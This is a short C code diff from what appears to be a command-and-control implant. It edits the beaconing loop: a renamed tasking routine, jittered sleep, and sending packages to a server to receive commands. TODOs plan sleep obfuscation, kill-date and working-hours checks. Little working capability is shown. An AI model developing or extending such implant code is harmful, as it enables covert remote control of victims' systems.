@@ -2,7 +2,7 @@
 #include "parser.h"
 #include "package.h"
 
-void PerformTask() {
+void TaskingRoutine() {
 
     PARSER   Parser = { 0 };
     DataBuffer   Buffer = { 0 };
@@ -19,17 +19,19 @@ void PerformTask() {
             break;
         
         //TODO implement encrypted sleep obfuscation.
-        Sleep((agent->config->SleepTime * 1000) + ((rand() % agent->config->SleepJitter) * 1000));
+        Sleep((agent->config->SleepTime * 1000) + ((GenerateRandomNumber() % agent->config->SleepJitter) * 1000));
 
         //TODO BUILD KILLDATE CHECK
 
         //TODO BUILD WORKING HOURS CHECK.
 
         //TODO perform package sending request. that will send all open packages and receive any responses from the server for commands to execute.
-        if (!PackageSendAll(agent, &Buffer, &DataBufferSize))
+        if (!PackageSendAll(&Buffer, &DataBufferSize))
         {
-            exit(-1);
+            break;
         }
+
+		//TODO parse the buffer and extract the command ID and request ID.
     }
 
 	
